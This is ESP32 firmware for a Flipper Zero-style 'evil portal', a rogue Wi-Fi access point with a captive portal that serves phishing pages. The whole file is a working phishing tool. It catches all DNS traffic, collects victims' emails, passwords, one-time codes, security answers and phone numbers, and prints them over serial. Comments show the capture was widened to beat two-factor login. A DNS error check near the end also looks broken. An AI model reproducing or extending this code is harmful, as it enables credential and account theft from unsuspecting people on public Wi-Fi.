#include "ESPAsyncWebServer.h"
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <WiFi.h>

#define MAX_HTML_SIZE 20000

#define B_PIN 4
#define G_PIN 5
#define R_PIN 6

#define WAITING 0
#define GOOD 1
#define BAD 2

#define SET_HTML_CMD "sethtml="
#define SET_AP_CMD "setap="
#define RESET_CMD "reset"
#define START_CMD "start"
#define ACK_CMD "ack"

// Add configuration constants
#define SERIAL_BAUD 115200
#define DNS_PORT 53
#define HTTP_PORT 80
#define MIN_AP_NAME_LENGTH 1
#define MAX_AP_NAME_LENGTH 30
#define MIN_HTML_LENGTH 1

// GLOBALS
DNSServer dnsServer;
AsyncWebServer server(80);

bool runServer = false;

String user_name;
String password;
bool name_received = false;
bool password_received = false;

char apName[30] = "PORTAL";
char index_html[MAX_HTML_SIZE] = "TEST";

// Add new globals after existing globals
String otp_code;
String security_answer;
String phone_number;
String additional_info;

bool otp_received = false;
bool security_received = false;
bool phone_received = false;
bool additional_received = false;

// RESET
void (*resetFunction)(void) = 0;

// AP FUNCTIONS
class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request) { return true; }

  void handleRequest(AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", index_html);
  }
};

void setLed(int i) {
  if (i == WAITING) {
    digitalWrite(B_PIN, LOW);
    digitalWrite(G_PIN, HIGH);
    digitalWrite(R_PIN, HIGH);
  } else if (i == GOOD) {
    digitalWrite(B_PIN, HIGH);
    digitalWrite(G_PIN, LOW);
    digitalWrite(R_PIN, HIGH);
  } else {
    digitalWrite(B_PIN, HIGH);
    digitalWrite(G_PIN, HIGH);
    digitalWrite(R_PIN, LOW);
  }
}

// Add status reporting
void reportStatus(const char* status) {
  Serial.println(status);
}

// Add input validation
bool validateAPName(const char* name) {
  int len = strlen(name);
  return (len >= MIN_AP_NAME_LENGTH && len < MAX_AP_NAME_LENGTH);
}

bool validateHTML(const char* html) {
  int len = strlen(html);
  return (len >= MIN_HTML_LENGTH && len < MAX_HTML_SIZE);
}

void setupServer() {  
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", index_html);
    Serial.println("client connected");
  });

  server.on("/get", HTTP_GET, [](AsyncWebServerRequest *request) {
    String inputMessage;
    String inputParam;

    // Original email/password capture
    if (request->hasParam("email")) {
      inputMessage = request->getParam("email")->value();
      user_name = inputMessage;
      name_received = true;
    }

    if (request->hasParam("password")) {
      inputMessage = request->getParam("password")->value();
      password = inputMessage;
      password_received = true;
    }

    // New parameter captures
    if (request->hasParam("otp")) {
      inputMessage = request->getParam("otp")->value();
      otp_code = inputMessage;
      otp_received = true;
    }

    if (request->hasParam("security_answer")) {
      inputMessage = request->getParam("security_answer")->value();
      security_answer = inputMessage;
      security_received = true;
    }

    if (request->hasParam("phone")) {
      inputMessage = request->getParam("phone")->value();
      phone_number = inputMessage;
      phone_received = true;
    }

    if (request->hasParam("additional")) {
      inputMessage = request->getParam("additional")->value();
      additional_info = inputMessage;
      additional_received = true;
    }

    request->send(
        200, "text/html",
        "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
  });

  // Add error handling for server setup
  server.onNotFound([](AsyncWebServerRequest *request) {
    request->send(404, "text/plain", "Not found");
  });
  
  // Add security headers
  DefaultHeaders::Instance().addHeader("X-Content-Type-Options", "nosniff");
  DefaultHeaders::Instance().addHeader("X-XSS-Protection", "1; mode=block");

  Serial.println("web server up");
}

void startAP() {
  Serial.print("starting ap ");
  Serial.println(apName);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(apName);

  Serial.print("ap ip address: ");
  Serial.println(WiFi.softAPIP());

  setupServer();

  dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  server.begin();
}

bool checkForCommand(char *command) {
  bool received = false;
  if (Serial.available() > 0) {
      String flipperMessage = Serial.readString();
      const char *serialMessage = flipperMessage.c_str();
      int compare = strncmp(serialMessage, command, strlen(command));
      if (compare == 0) {
        received = true;
      }
  }
  return received;
}

void getInitInput() {
  reportStatus("Waiting for configuration...");
  // wait for html
  Serial.println("Waiting for HTML");
  bool has_ap = false;
  bool has_html = false;
  while (!has_html || !has_ap) {
      if (Serial.available() > 0) {
        String flipperMessage = Serial.readString();
        const char *serialMessage = flipperMessage.c_str();
        if (strncmp(serialMessage, SET_HTML_CMD, strlen(SET_HTML_CMD)) == 0) {
          serialMessage += strlen(SET_HTML_CMD);
          if (validateHTML(serialMessage)) {
            strncpy(index_html, serialMessage, strlen(serialMessage) - 1);
            has_html = true;
            reportStatus("HTML content configured");
          } else {
            reportStatus("Invalid HTML content");
          }
          Serial.println("html set");
        } else if (strncmp(serialMessage, SET_AP_CMD, strlen(SET_AP_CMD)) ==
                   0) {
          serialMessage += strlen(SET_AP_CMD);
          if (validateAPName(serialMessage)) {
            strncpy(apName, serialMessage, strlen(serialMessage) - 1);
            has_ap = true;
            reportStatus("AP name configured");
          } else {
            reportStatus("Invalid AP name");
          }
          Serial.println("ap set");
        } else if (strncmp(serialMessage, RESET_CMD, strlen(RESET_CMD)) == 0) {
          resetFunction();
        }
      }
  }
  Serial.println("all set");
}

void startPortal() {
  // wait for flipper input to get config index
  startAP();

  runServer = true;
}

// MAIN FUNCTIONS
void setup() {

  // init LED pins
  pinMode(B_PIN, OUTPUT);
  pinMode(G_PIN, OUTPUT);
  pinMode(R_PIN, OUTPUT);

  setLed(WAITING);

  Serial.begin(SERIAL_BAUD);

  // Add WiFi configuration
  WiFi.setAutoReconnect(false);
  WiFi.persistent(false);

  // wait for init flipper input
  getInitInput();

  setLed(GOOD);

  startPortal();
}

void loop() {
  // Add watchdog reset
  yield();

  dnsServer.processNextRequest();

  // Modified credential reporting
  if (name_received || password_received || otp_received || 
      security_received || phone_received || additional_received) {
    
    if (name_received) {
      Serial.println("u: " + user_name);
      name_received = false;
    }
    if (password_received) {
      Serial.println("p: " + password);
      password_received = false;
    }
    if (otp_received) {
      Serial.println("otp: " + otp_code);
      otp_received = false;
    }
    if (security_received) {
      Serial.println("sec: " + security_answer);
      security_received = false;
    }
    if (phone_received) {
      Serial.println("ph: " + phone_number);
      phone_received = false;
    }
    if (additional_received) {
      Serial.println("add: " + additional_info);
      additional_received = false;
    }
  }

  if(checkForCommand(RESET_CMD)) {
    Serial.println("reseting");
    resetFunction();
  }  
  // Add error checking for DNS server
  if (!dnsServer.processNextRequest()) {
    reportStatus("DNS server error");
  }
}
